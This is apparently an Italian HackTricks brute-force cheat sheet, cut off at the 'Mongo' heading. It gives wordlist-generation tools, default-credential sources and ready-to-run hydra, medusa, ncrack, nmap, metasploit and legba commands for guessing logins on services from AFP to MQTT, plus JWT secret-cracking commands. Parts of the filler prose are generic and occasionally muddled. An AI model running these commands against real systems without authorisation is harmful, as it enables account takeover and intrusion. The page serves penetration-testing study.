# Brute Force - CheatSheet

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utilizza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare e automatizzare facilmente flussi di lavoro con gli strumenti della community più avanzati al mondo.\
Ottieni l'accesso oggi stesso:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata in HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Credenziali predefinite

**Cerca su Google** le credenziali predefinite della tecnologia utilizzata, oppure **prova questi link**:

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **Crea i tuoi dizionari**

Trova il maggior numero di informazioni possibile sul target e genera un dizionario personalizzato. Strumenti che possono aiutare:

### Crunch
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl

Cewl è uno strumento di raccolta di parole chiave che può essere utilizzato per generare liste di parole chiave basate su un sito web o un documento di testo. Questo strumento è particolarmente utile per l'attacco di forza bruta, in quanto può generare una lista di parole chiave basata sul contenuto del sito web target o di un documento specifico.

Per utilizzare Cewl, è possibile eseguire il seguente comando:

```
cewl <URL o percorso del file> -w <nome del file di output>
```

Questo comando genererà un file di output contenente le parole chiave estratte dal sito web o dal documento specificato. Le parole chiave possono quindi essere utilizzate per l'attacco di forza bruta, ad esempio per tentare di indovinare le password o i nomi utente.

Cewl supporta anche alcune opzioni aggiuntive, come la possibilità di specificare una profondità di scansione per il sito web target o di escludere determinate parole chiave. Queste opzioni possono essere utili per raffinare la lista di parole chiave generata.

È importante notare che l'utilizzo di Cewl per l'attacco di forza bruta può essere illegale senza il consenso del proprietario del sito web o del documento. Pertanto, è fondamentale ottenere sempre l'autorizzazione appropriata prima di utilizzare questo strumento per scopi di hacking.
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

Genera password basate sulla tua conoscenza della vittima (nomi, date...)
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

Uno strumento generatore di liste di parole, che ti consente di fornire un insieme di parole, offrendoti la possibilità di creare molteplici varianti dalle parole fornite, creando una lista di parole unica e ideale da utilizzare in relazione a un obiettivo specifico.
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### Liste di parole

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Usa [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) per creare e automatizzare facilmente flussi di lavoro con gli strumenti della comunità più avanzati al mondo.\
Ottieni l'accesso oggi stesso:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Servizi

Ordinati in ordine alfabetico per nome del servizio.

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP

L'AJP (Apache JServ Protocol) è un protocollo di comunicazione utilizzato per la comunicazione tra un server web Apache e un server applicativo Java. È spesso utilizzato per consentire alle applicazioni web di comunicare con i server di backend Java.

L'AJP può essere sfruttato per condurre attacchi di forza bruta contro applicazioni web che utilizzano questo protocollo. L'attaccante può tentare di indovinare le credenziali di accesso o le informazioni sensibili utilizzando un elenco di password comuni o tramite un attacco di dizionario.

Per eseguire un attacco di forza bruta AJP, è possibile utilizzare strumenti come Hydra o Medusa. Questi strumenti consentono di automatizzare il processo di tentativi di accesso con diverse combinazioni di nome utente e password.

È importante notare che l'esecuzione di un attacco di forza bruta senza l'autorizzazione esplicita del proprietario del sistema è illegale e può comportare conseguenze legali. Pertanto, è fondamentale ottenere il consenso del proprietario del sistema prima di eseguire qualsiasi tipo di attacco di forza bruta.
```bash
nmap --script ajp-brute -p 8009 <IP>
```
## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM and Solace)

AMQP (Advanced Message Queuing Protocol) è un protocollo di messaggistica avanzato che viene utilizzato da diverse piattaforme di messaggistica, tra cui ActiveMQ, RabbitMQ, Qpid, JORAM e Solace. Queste piattaforme consentono la comunicazione asincrona tra applicazioni distribuite.

La forza bruta può essere utilizzata per tentare di indovinare le credenziali di accesso a queste piattaforme AMQP. Di seguito sono riportati alcuni metodi comuni per eseguire un attacco di forza bruta su queste piattaforme:

### 1. Dizionario di attacco

Un attacco di forza bruta basato su un dizionario coinvolge l'utilizzo di un elenco di possibili password per tentare di indovinare quella corretta. È possibile utilizzare strumenti come Hydra o Medusa per eseguire questo tipo di attacco. Assicurarsi di utilizzare un dizionario di password completo e aggiornato per massimizzare le possibilità di successo.

Esempio di comando Hydra per un attacco di forza bruta su RabbitMQ:

```plaintext
hydra -L <username_list> -P <password_list> amqp://<target_ip>:<port>
```

### 2. Attacco di forza bruta con tentativi di accesso multipli

Alcune piattaforme AMQP, come RabbitMQ, consentono un numero limitato di tentativi di accesso prima di bloccare l'indirizzo IP del mittente. In questo caso, è possibile utilizzare uno script o uno strumento di automazione per eseguire tentativi di accesso multipli utilizzando diverse combinazioni di nome utente e password. Assicurarsi di utilizzare un elenco di credenziali valide per massimizzare le possibilità di successo.

### 3. Attacco di forza bruta con password predefinite

Alcune piattaforme AMQP, come ActiveMQ, potrebbero avere password predefinite per l'accesso amministrativo. È possibile utilizzare queste password predefinite per eseguire un attacco di forza bruta. Assicurarsi di verificare la documentazione della piattaforma per identificare le password predefinite e utilizzarle durante l'attacco.

### 4. Attacco di forza bruta con fuzzing

Il fuzzing è una tecnica che coinvolge l'invio di dati casuali o semi-validi a un'applicazione per cercare di provocare un comportamento imprevisto. È possibile utilizzare lo strumento AFL (American Fuzzy Lop) per eseguire un attacco di forza bruta con fuzzing su piattaforme AMQP come Qpid o JORAM. Questo tipo di attacco può rivelare vulnerabilità sconosciute o non documentate nella piattaforma.

### 5. Attacco di forza bruta con password leak

Se sono state compromesse altre piattaforme o servizi che utilizzano le stesse credenziali di accesso, è possibile utilizzare queste credenziali trapelate per eseguire un attacco di forza bruta su una piattaforma AMQP. È possibile trovare credenziali trapelate su siti web di leak o forum di hacking. Assicurarsi di utilizzare solo credenziali trapelate legittime e di verificare la loro validità prima di utilizzarle per l'attacco.

Ricorda che l'attacco di forza bruta è un'attività illegale e può comportare conseguenze legali. Utilizza queste informazioni solo a fini educativi o con il consenso scritto del proprietario del sistema.
```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```
### Cassandra

Cassandra è un sistema di gestione di database distribuito altamente scalabile e altamente disponibile. È progettato per gestire grandi quantità di dati su cluster di server senza punti di singolo guasto. Cassandra utilizza un modello di dati distribuito e una replica dei dati su più nodi per garantire la tolleranza ai guasti e la disponibilità continua.

#### Brute Force

La forza bruta è una tecnica di attacco che coinvolge la prova di tutte le possibili combinazioni di password fino a trovare quella corretta. Questo metodo sfrutta la debolezza delle password deboli o prevedibili per ottenere l'accesso non autorizzato a un sistema o a un account. La forza bruta può essere utilizzata per attaccare i sistemi di autenticazione di Cassandra, cercando di indovinare la password di un utente o di un account amministratore. Per proteggersi da attacchi di forza bruta, è consigliabile utilizzare password complesse e un sistema di autenticazione robusto. Inoltre, è possibile implementare misure di sicurezza come il blocco temporaneo dell'account dopo un certo numero di tentativi falliti di accesso.
```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```
### CouchDB

CouchDB è un database NoSQL che utilizza il modello di dati a documento. È noto per la sua scalabilità e la sua capacità di gestire grandi quantità di dati. Tuttavia, come qualsiasi altro sistema, può essere soggetto a attacchi di forza bruta.

La forza bruta su CouchDB coinvolge l'uso di programmi o script per tentare di indovinare le credenziali di accesso di un database. Questo può essere fatto provando una serie di combinazioni di nomi utente e password fino a trovare quelle corrette.

Per eseguire un attacco di forza bruta su CouchDB, è possibile utilizzare strumenti come Hydra o Medusa. Questi strumenti consentono di automatizzare il processo di tentativi di accesso, riducendo il tempo necessario per trovare le credenziali corrette.

Tuttavia, è importante notare che l'attacco di forza bruta è un'attività illegale e non etica, a meno che non venga eseguito con il consenso del proprietario del sistema. Pertanto, è fondamentale utilizzare queste informazioni solo a fini educativi e legali.
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
### Docker Registry

Il Docker Registry è un'applicazione che consente di archiviare e distribuire immagini Docker. È possibile utilizzare il Docker Registry per creare un repository privato di immagini Docker e gestire l'accesso e le autorizzazioni degli utenti. In questo modo, è possibile controllare chi può scaricare e caricare le immagini nel repository.

Il Docker Registry supporta l'autenticazione degli utenti e offre diverse opzioni per la gestione delle autorizzazioni. È possibile configurare il Docker Registry per consentire l'accesso pubblico alle immagini o limitare l'accesso solo a determinati utenti o gruppi.

Per proteggere il Docker Registry da attacchi di forza bruta, è consigliabile utilizzare una combinazione di misure di sicurezza, come l'utilizzo di password complesse, l'implementazione di limiti di tentativi di accesso e l'utilizzo di certificati SSL per crittografare le comunicazioni.

Inoltre, è possibile monitorare l'attività del Docker Registry utilizzando strumenti di logging e monitoraggio. Questi strumenti consentono di identificare e rispondere rapidamente a eventuali tentativi di accesso non autorizzati o attività sospette.

In conclusione, il Docker Registry è uno strumento essenziale per la gestione delle immagini Docker e la sicurezza del repository è fondamentale per proteggere le immagini da accessi non autorizzati.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
### Elasticsearch

Elasticsearch è un motore di ricerca e analisi distribuito, basato su Lucene, che viene utilizzato per l'indicizzazione e la ricerca di grandi quantità di dati in tempo reale. È ampiamente utilizzato per l'archiviazione e l'analisi dei log, la ricerca di testo completo e l'analisi dei dati strutturati.

#### Brute Force

La tecnica di Brute Force è un metodo di attacco che consiste nel tentare tutte le possibili combinazioni di password fino a trovare quella corretta. Questo tipo di attacco è spesso utilizzato per violare la sicurezza di un sistema o di un account utente.

Nel contesto di Elasticsearch, un attacco di Brute Force può essere utilizzato per tentare di indovinare le credenziali di accesso a un'istanza di Elasticsearch. Gli attaccanti possono utilizzare strumenti automatizzati per generare e testare una vasta gamma di password fino a trovare quella corretta.

Per proteggere un'istanza di Elasticsearch da attacchi di Brute Force, è consigliabile adottare le seguenti misure di sicurezza:

- Utilizzare password complesse e uniche per l'accesso all'istanza di Elasticsearch.
- Imporre limiti di tentativi di accesso per evitare attacchi di forza bruta.
- Monitorare e registrare i tentativi di accesso falliti per rilevare eventuali attacchi in corso.
- Utilizzare strumenti di rilevamento delle intrusioni per identificare e bloccare gli indirizzi IP sospetti.

È importante prendere sul serio la sicurezza di Elasticsearch e adottare le misure appropriate per proteggere le proprie istanze da attacchi di Brute Force e altre minacce.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

FTP (File Transfer Protocol) è un protocollo di rete utilizzato per il trasferimento di file tra un client e un server su una rete TCP/IP. Il protocollo FTP utilizza una modalità di autenticazione basata su nome utente e password per consentire l'accesso al server FTP.

#### Brute Force su FTP

La tecnica di Brute Force su FTP coinvolge l'utilizzo di un programma o uno script per tentare di indovinare la combinazione corretta di nome utente e password per accedere a un server FTP. Questo viene fatto provando tutte le possibili combinazioni di nome utente e password fino a quando non viene trovata quella corretta.

#### Strumenti per il Brute Force su FTP

Esistono diversi strumenti disponibili per eseguire un attacco di Brute Force su FTP. Alcuni esempi includono Hydra, Medusa e Ncrack. Questi strumenti consentono di automatizzare il processo di tentativi di accesso al server FTP con diverse combinazioni di nome utente e password.

#### Contromisure per il Brute Force su FTP

Per proteggere un server FTP dagli attacchi di Brute Force, è possibile adottare diverse contromisure, tra cui:

- Imporre limiti sul numero di tentativi di accesso consentiti prima di bloccare l'indirizzo IP del mittente.
- Utilizzare password complesse e uniche per gli account FTP.
- Monitorare i log di accesso per rilevare attività sospette.
- Utilizzare un firewall per filtrare il traffico indesiderato verso il server FTP.
- Aggiornare regolarmente il software del server FTP per correggere eventuali vulnerabilità note.

#### Conclusioni

Il Brute Force su FTP è una tecnica comune utilizzata dagli hacker per ottenere accesso non autorizzato a server FTP. Tuttavia, con le giuste contromisure e una buona gestione della sicurezza, è possibile proteggere efficacemente un server FTP da tali attacchi.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```
### Brute Force Generico HTTP

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### Autenticazione di base HTTP
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```
### HTTP - NTLM

NTLM (NT LAN Manager) è un protocollo di autenticazione utilizzato in ambienti Windows. È possibile utilizzare un attacco di forza bruta per tentare di indovinare le credenziali NTLM di un utente.

#### Attacco di forza bruta NTLM

L'attacco di forza bruta NTLM coinvolge l'invio di molteplici tentativi di accesso con diverse combinazioni di nome utente e password. L'obiettivo è trovare la combinazione corretta che consenta l'accesso al sistema.

Per eseguire un attacco di forza bruta NTLM, è possibile utilizzare strumenti come Hydra o Medusa. Questi strumenti consentono di automatizzare il processo di invio di tentativi di accesso.

#### Protezione contro gli attacchi di forza bruta NTLM

Per proteggersi dagli attacchi di forza bruta NTLM, è possibile adottare le seguenti misure:

- Utilizzare password complesse e uniche per ogni account.
- Implementare politiche di blocco dell'account dopo un numero specifico di tentativi di accesso falliti.
- Monitorare i log di accesso per rilevare attività sospette.
- Utilizzare strumenti di rilevamento delle intrusioni per identificare e bloccare gli attacchi di forza bruta.

È importante notare che l'attacco di forza bruta NTLM è un'attività illegale e può comportare conseguenze legali. È fondamentale utilizzare queste informazioni solo a fini educativi o autorizzati.
```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```
### HTTP - Invio di un modulo

L'invio di un modulo tramite una richiesta HTTP POST è un'operazione comune nel contesto dell'hacking. Questa tecnica può essere utilizzata per eseguire attacchi di forza bruta su pagine web che richiedono l'inserimento di dati tramite un modulo.

Per eseguire un attacco di forza bruta tramite HTTP POST, è necessario conoscere i parametri del modulo e i valori che possono essere inviati. Queste informazioni possono essere ottenute analizzando il codice sorgente della pagina web o utilizzando strumenti come Burp Suite o ZAP Proxy.

Una volta ottenute le informazioni necessarie, è possibile utilizzare uno script o uno strumento di automazione per inviare richieste POST ripetute, variando i valori dei parametri nel tentativo di indovinare la combinazione corretta. Questo processo può richiedere tempo, poiché è necessario provare diverse combinazioni fino a trovare quella corretta.

È importante notare che l'esecuzione di attacchi di forza bruta senza l'autorizzazione del proprietario del sistema è illegale e può comportare conseguenze legali. Pertanto, è fondamentale ottenere sempre il consenso scritto prima di eseguire qualsiasi tipo di attacco di forza bruta.
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
Per http**s** devi cambiare da "http-post-form" a "**https-post-form"**

### **HTTP - CMS --** (W)ordpress, (J)oomla o (D)rupal o (M)oodle
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```
### IMAP

IMAP (Internet Message Access Protocol) è un protocollo di posta elettronica che consente agli utenti di accedere e gestire le proprie caselle di posta su un server remoto. A differenza del protocollo POP3, IMAP consente agli utenti di mantenere una copia delle email sul server, consentendo l'accesso da più dispositivi. 

#### Brute Force su IMAP

La tecnica di Brute Force su IMAP coinvolge l'uso di programmi o script per tentare di indovinare le credenziali di accesso di un account IMAP. Questo viene fatto provando una serie di combinazioni di username e password fino a quando non viene trovata una corrispondenza valida. 

Per eseguire un attacco di Brute Force su IMAP, è possibile utilizzare strumenti come Hydra o Medusa. Questi strumenti consentono di automatizzare il processo di tentativi di accesso, riducendo il tempo necessario per indovinare le credenziali. 

Tuttavia, è importante notare che l'attacco di Brute Force su IMAP può richiedere molto tempo, specialmente se le credenziali sono complesse o se il server impone limiti sul numero di tentativi di accesso consentiti. Inoltre, l'uso di questa tecnica può essere considerato illegale senza il consenso esplicito del proprietario dell'account o del sistema. Pertanto, è fondamentale ottenere l'autorizzazione appropriata prima di eseguire un attacco di Brute Force su IMAP.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```
IRC (Internet Relay Chat) è un protocollo di comunicazione testuale utilizzato per la chat in tempo reale su Internet. È ampiamente utilizzato per la comunicazione tra utenti in diverse comunità online. Gli utenti si connettono a server IRC e possono partecipare a canali di chat o comunicare direttamente con altri utenti. IRC è noto per la sua semplicità e flessibilità, ma può anche essere vulnerabile ad attacchi di forza bruta. Gli attaccanti possono utilizzare tecniche di forza bruta per indovinare le password degli utenti e ottenere accesso non autorizzato ai loro account IRC. È importante utilizzare password complesse e uniche per proteggere i propri account IRC e prevenire attacchi di forza bruta.
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI

L'iSCSI (Internet Small Computer System Interface) è un protocollo di rete che consente di trasferire dati su una rete IP utilizzando il protocollo SCSI. L'iSCSI viene spesso utilizzato per collegare dispositivi di storage come dischi rigidi, unità a nastro e array di storage a server remoti su una rete IP.

L'iSCSI utilizza il concetto di iniziatore e bersaglio. L'iniziatore è il dispositivo che avvia la richiesta di trasferimento dati, mentre il bersaglio è il dispositivo di storage che risponde alla richiesta. L'iniziatore e il bersaglio comunicano tra loro utilizzando pacchetti iSCSI che vengono inviati tramite la rete IP.

L'iSCSI può essere utilizzato per creare una connessione diretta tra un server e un dispositivo di storage remoto, consentendo al server di accedere ai dati memorizzati sul dispositivo di storage come se fossero locali. Questo può essere utile in situazioni in cui è necessario condividere dati tra server remoti o quando è necessario accedere a un dispositivo di storage da una posizione geografica diversa.

L'iSCSI può essere soggetto a attacchi di forza bruta, in cui un attaccante cerca di indovinare le credenziali di accesso al dispositivo di storage. È importante utilizzare password complesse e metodi di autenticazione sicuri per proteggere le connessioni iSCSI da tali attacchi.
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
### JWT

JSON Web Token (JWT) è uno standard aperto (RFC 7519) che definisce un modo compatto e autonomo per trasmettere informazioni in modo sicuro tra le parti come un oggetto JSON. Queste informazioni possono essere verificate e fidate perché sono firmate digitalmente. JWT viene spesso utilizzato per l'autenticazione e l'autorizzazione in applicazioni web e API.

#### Struttura di un JWT

Un JWT è composto da tre parti separate da punti: l'intestazione (header), il payload (carico utile) e la firma (signature). La struttura di un JWT è la seguente:

```
xxxxx.yyyyy.zzzzz
```

##### Intestazione (Header)

L'intestazione di un JWT contiene due elementi: il tipo di token, che è JWT, e l'algoritmo di firma utilizzato per firmare il token. L'intestazione è codificata in Base64URL.

Esempio:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

##### Payload (Carico utile)

Il payload di un JWT contiene le informazioni che vogliamo trasmettere. Può contenere qualsiasi numero di coppie chiave-valore. Il payload è codificato in Base64URL.

Esempio:

```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "admin": true
}
```

##### Firma (Signature)

La firma di un JWT viene calcolata utilizzando l'intestazione codificata in Base64URL, il payload codificato in Base64URL e una chiave segreta. L'algoritmo di firma specificato nell'intestazione viene utilizzato per calcolare la firma. La firma viene quindi aggiunta al token.

Esempio:

```
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret)
```

#### Utilizzo di JWT

Un JWT può essere utilizzato per autenticare un utente o per trasmettere informazioni aggiuntive tra le parti. Quando un utente si autentica, viene generato un JWT che contiene le informazioni di autenticazione dell'utente. Questo token viene quindi inviato all'utente e viene utilizzato per autenticare le richieste successive.

Per verificare l'autenticità di un JWT, il server verifica la firma del token utilizzando la chiave segreta. Se la firma è valida, il server può fidarsi delle informazioni contenute nel token.

#### Sicurezza di JWT

È importante proteggere la chiave segreta utilizzata per firmare i JWT. Se un attaccante riesce a ottenere la chiave segreta, può generare token falsi e impersonare altri utenti. Inoltre, è importante utilizzare algoritmi di firma sicuri e verificare attentamente le informazioni contenute nel token per evitare attacchi come l'iniezione di payload.

#### Conclusioni

JWT è uno standard popolare per l'autenticazione e l'autorizzazione in applicazioni web e API. Con una struttura semplice e una firma digitale, JWT offre un modo sicuro per trasmettere informazioni tra le parti. Tuttavia, è importante utilizzare JWT in modo sicuro, proteggendo la chiave segreta e verificando attentamente le informazioni contenute nel token.
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
### LDAP

LDAP (Lightweight Directory Access Protocol) è un protocollo di rete utilizzato per accedere e gestire le informazioni memorizzate in un servizio di directory. È ampiamente utilizzato per l'autenticazione e l'autorizzazione degli utenti in un ambiente di rete. 

#### Brute Force su LDAP

La tecnica di Brute Force su LDAP coinvolge l'uso di programmi o script per tentare di indovinare le credenziali di accesso di un utente LDAP. Questo viene fatto provando una serie di combinazioni di nomi utente e password fino a quando non viene trovata una corrispondenza valida. 

Per eseguire un attacco di Brute Force su LDAP, è possibile utilizzare strumenti come Hydra o Medusa, che consentono di automatizzare il processo di tentativi di accesso. È importante notare che questo tipo di attacco può richiedere molto tempo, poiché il numero di combinazioni possibili può essere molto elevato. Pertanto, è consigliabile utilizzare un elenco di password comuni o personalizzate per ridurre il tempo necessario per completare l'attacco. 

È importante notare che l'esecuzione di un attacco di Brute Force su LDAP senza l'autorizzazione esplicita del proprietario del sistema è illegale e può comportare conseguenze legali. Pertanto, è fondamentale ottenere il consenso prima di eseguire qualsiasi tipo di attività di hacking.
```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```
### MQTT

MQTT (Message Queuing Telemetry Transport) è un protocollo di messaggistica leggero e scalabile, ideale per le comunicazioni tra dispositivi con risorse limitate. MQTT è ampiamente utilizzato nell'Internet delle cose (IoT) per consentire lo scambio di dati tra sensori, dispositivi e applicazioni.

#### Brute Force su MQTT

La tecnica di Brute Force su MQTT consiste nel tentare di indovinare le credenziali di accesso a un broker MQTT utilizzando un attacco di forza bruta. Questo tipo di attacco sfrutta la debolezza delle password deboli o predefinite per ottenere l'accesso non autorizzato al broker MQTT.

Per eseguire un attacco di forza bruta su MQTT, è possibile utilizzare strumenti come `mqtt-brute` o `mosquitto_pub` per inviare tentativi di accesso con diverse combinazioni di nome utente e password. È importante notare che questo tipo di attacco può richiedere molto tempo, poiché il broker MQTT può limitare il numero di tentativi di accesso consentiti entro un determinato periodo di tempo.

Per proteggere un broker MQTT da attacchi di forza bruta, è consigliabile utilizzare password complesse e un meccanismo di blocco temporaneo per limitare il numero di tentativi di accesso consentiti. Inoltre, è possibile implementare misure di sicurezza come l'autenticazione a due fattori o l'utilizzo di certificati SSL/TLS per garantire una maggiore protezione delle comunicazioni MQTT.
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```
### Mongo

